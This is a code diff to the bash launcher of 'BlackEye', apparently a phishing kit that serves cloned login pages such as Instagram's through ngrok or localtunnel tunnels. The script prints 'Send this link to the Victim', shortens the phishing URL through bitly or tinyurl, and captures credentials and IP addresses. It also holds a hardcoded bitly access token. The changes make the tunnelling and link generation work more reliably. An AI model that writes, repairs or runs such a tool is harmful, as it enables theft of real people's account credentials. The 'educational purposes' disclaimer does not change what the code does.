@@ -1,24 +1,74 @@
 #!/bin/bash
 
+SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
+cd "$SCRIPT_DIR" || exit 1
+
+open_url() {
+    url=$1
+    if command -v xdg-open >/dev/null 2>&1; then
+        xdg-open "$url" >/dev/null 2>&1
+    elif command -v open >/dev/null 2>&1; then
+        open "$url"
+    else
+        printf "\e[1;93m[!] Open this link manually:\e[0m %s\n" "$url"
+    fi
+}
+
 open_page() {
-    url="https://github.com/EricksonAtHome/bes"
-     open "$url"
+    open_url "https://github.com/EricksonAtHome/bes"
 }
 
 open_page_uts() {
-    url="https://github.com/EricksonAtHome/UTS7"
-     open "$url"
+    open_url "https://github.com/EricksonAtHome/UTS7"
 }
 
+check_dependencies() {
+    local missing=0
 
-start_server() {
-    server=$1
-    # Start de server
-    echo "Start de server voor: $server"
+    if ! command -v php >/dev/null 2>&1; then
+        printf "\e[1;93m[!] PHP is required. Install it first (e.g. apt install php).\e[0m\n"
+        missing=1
+    fi
+
+    if ! command -v jq >/dev/null 2>&1; then
+        printf "\e[1;93m[!] jq is required. Install it first (e.g. apt install jq).\e[0m\n"
+        missing=1
+    fi
+
+    if [[ $missing -eq 1 ]]; then
+        exit 1
+    fi
+}
+
+ensure_localtunnel() {
+    if [[ ! -x node_modules/.bin/lt ]] && [[ ! -x node_modules/.bin/localtunnel ]]; then
+        if command -v npm >/dev/null 2>&1; then
+            printf "\e[1;92m[*] Installing localtunnel dependencies...\e[0m\n"
+            npm install --no-fund --no-audit >/dev/null 2>&1 || {
+                printf "\e[1;93m[!] Failed to install localtunnel. Run: npm install\e[0m\n"
+                exit 1
+            }
+        else
+            printf "\e[1;93m[!] Node.js/npm is required for Localtunnel.\e[0m\n"
+            exit 1
+        fi
+    fi
+}
+
+localtunnel_bin() {
+    if [[ -x node_modules/.bin/lt ]]; then
+        echo "./node_modules/.bin/lt"
+    else
+        echo "./node_modules/.bin/localtunnel"
+    fi
+}
+
+site_exists() {
+    [[ -d "sites/$1" ]]
 }
 
 # Upgraded by: @EricksonAtHome (https://github.com/EricksonAtHome/blackeye)
-#Enhanced ngrok tunnelling
+# Enhanced ngrok tunnelling
 trap 'printf "\n";stop;exit 1' 2
 menu() {
 
@@ -48,9 +98,14 @@ printf "          \e[1;92m[\e[0m\e[1;77m42\e[0m\e[1;92m]\e[0m\e[1;91m User Track
 
 
 read -p $'\n\e[1;92m\e[0m\e[1;77m\e[0m\e[1;92m ┌─[ Choose an option:]─[~]
- └──╼ ~ ' option
+ └──╼ ~ ' option || exit 0
 
-
+option="${option// /}"
+if [[ "$option" =~ ^[0-9]+$ ]]; then
+option=$((10#$option))
+else
+option=0
+fi
 
 if [[ $option == 1 ]]; then
 server="instagram"
@@ -217,7 +272,11 @@ elif [[ $option == 42 ]]; then
 
 else
 printf "\e[1;93m [!] Invalid option!\e[0m\n"
+if [[ -t 0 ]]; then
 menu
+else
+exit 1
+fi
 fi
 }
 
@@ -247,7 +306,7 @@ banner() {
 
 printf "     \e[101m\e[1;77m:: Disclaimer: Developers assume no liability and are not    ::\e[0m\n"
 printf "     \e[101m\e[1;77m:: responsible for any misuse or damage caused by BlackEye.  ::\e[0m\n"
-printf "     \e[101m\e[1;77m:: Only use for educational purporses!!                      ::\e[0m\n"
+printf "     \e[101m\e[1;77m:: Only use for educational purposes!!                       ::\e[0m\n"
 printf "\n"
 printf "     \e[101m\e[1;77m::     BLACKEYE By @EricksonAtHome                           ::\e[0m\n"
 printf "\n"
@@ -367,19 +426,41 @@ cat sites/$server/ip.txt >> sites/$server/saved.ip.txt
 getcredentials
 }
 start() {
+if ! site_exists "$server"; then
+printf "\e[1;93m[!] Template not available: sites/%s\e[0m\n" "$server"
+printf "\e[1;93m[!] This repository currently ships a limited set of templates.\e[0m\n"
+printf "\e[1;93m[!] See README.md for the list of included sites.\e[0m\n"
+menu
+return
+fi
+
 printf "\n"
 printf "1.Ngrok\n"
 printf "2.Localtunnel\n"
 echo ""
 read -p $'\n\e[1;92m\e[0m\e[1;77m\e[0m\e[1;92m ┌─[ Choose the tunneling method:]─[~]
- └──╼ ~ ' host
- 
+ └──╼ ~ ' host || exit 1
+
+host="${host// /}"
+if [[ "$host" =~ ^[0-9]+$ ]]; then
+host=$((10#$host))
+else
+host=0
+fi
+
 if [[ $host == 1 ]]; then
 sleep 1
 start_ngrok
 elif [[ $host == 2 ]]; then
 sleep 1
 start_localtunnel
+else
+printf "\e[1;93m [!] Invalid tunnel option!\e[0m\n"
+if [[ -t 0 ]]; then
+start
+else
+exit 1
+fi
 fi
 }
 
@@ -429,13 +510,16 @@ fi
 fi
 
 printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
-cd sites/$server && php -S 127.0.0.1:5555 > /dev/null 2>&1 & 
+( cd "sites/$server" && php -S 127.0.0.1:5555 > /dev/null 2>&1 ) &
 sleep 2
 printf "\e[1;92m[\e[0m*\e[1;92m] Starting ngrok server...\n"
-./ngrok http 127.0.0.1:5555  > /dev/null 2>&1 &
+./ngrok http 127.0.0.1:5555 > /dev/null 2>&1 &
 sleep 10
 
-link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
+link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -oE "https://[-0-9a-zA-Z._]*\.(ngrok-free\.app|ngrok\.io)")
+if [[ -z $link ]]; then
+link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | jq -r '.tunnels[] | select(.proto=="https") | .public_url' | head -n1)
+fi
 printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Victim:\e[0m\e[1;77m %s\e[0m\n" $link
 Accesstoken=433bdc6028d67bba06cf95286e923cde8c0906c7
 api=https://api-ssl.bitly.com/v4/shorten
@@ -456,18 +540,26 @@ rm -rf sites/$server/usernames.txt
 
 fi
 
+ensure_localtunnel
+lt_log=$(mktemp)
+lt_bin=$(localtunnel_bin)
+
 printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
-cd sites/$server && php -S 127.0.0.1:5555 > /dev/null 2>&1 & 
+( cd "sites/$server" && php -S 127.0.0.1:5555 > /dev/null 2>&1 ) &
 sleep 2
 
 printf "\e[1;92m[\e[0m*\e[1;92m] Starting localtunnel server...\n"
-./ngrok http 127.0.0.1:5555  > /dev/null 2>&1 &
-sleep 8
-lt --port 5555 --subdomain wmw-$server-com > /dev/null 2>&1 &
-sleep 4
-printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Victim:\e[0m\e[1;77m %s\e[0m\n" "https://wmw-"$server"-com.loca.lt"
-short_link=`wget -q -O - http://tinyurl.com/api-create.php?url=https://wmw-$server-com.loca.lt`
-printf "\e[1;92m[\e[0m*\e[1;92m] Use shortened link instead:\e[0m\e[1;77m %s\e[0m\n" $short_link
+$lt_bin --port 5555 > "$lt_log" 2>&1 &
+sleep 5
+link=$(grep -oE 'https://[a-zA-Z0-9-]+\.loca\.lt' "$lt_log" | head -n1)
+if [[ -z $link ]]; then
+printf "\e[1;93m[!] Could not start Localtunnel. Check %s for details.\e[0m\n" "$lt_log"
+exit 1
+fi
+printf "\e[1;93m[!] Localtunnel may ask visitors for your public IP on first load.\e[0m\n"
+printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Victim:\e[0m\e[1;77m %s\e[0m\n" "$link"
+short_link=$(wget -q -O - "http://tinyurl.com/api-create.php?url=$link" 2>/dev/null)
+printf "\e[1;92m[\e[0m*\e[1;92m] Use shortened link instead:\e[0m\e[1;77m %s\e[0m\n" "$short_link"
 echo ""
 echo ""
 
@@ -490,10 +582,6 @@ sleep 1
 done 
 
 }
-rm -rf setup.sh
-rm -rf tmxsp.sh
-rm -rf index.html
-rm -rf .gitignore
-rm -rf .nojekyll
+check_dependencies
 banner
 menu
